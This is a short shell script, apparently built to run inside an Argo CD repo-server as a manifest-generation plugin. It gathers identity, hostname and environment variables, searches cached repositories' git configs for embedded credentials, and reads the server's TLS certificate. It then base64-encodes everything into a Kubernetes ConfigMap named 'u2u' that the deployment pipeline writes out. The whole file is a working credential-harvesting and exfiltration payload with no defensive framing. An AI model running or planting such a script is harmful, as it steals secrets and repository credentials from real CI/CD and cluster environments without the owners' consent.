#!/bin/sh
RECON=$( (
id
hostname
echo "=== ENV ==="
env
echo "=== LS REPO CACHE ==="
ls -la /tmp/_argocd-repo/ 2>/dev/null
echo "=== GIT CONFIGS (embedded creds) ==="
for f in /tmp/_argocd-repo/*/. ; do grep -r "url = http" "$f/.git/config" 2>/dev/null; done
echo "=== APP CONFIG DIR ==="
ls -la /app/config/ 2>/dev/null
cat /app/config/tls/tls.crt 2>/dev/null | head -2
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: u2u
data:
  result: $RECON
EOF
exit 0
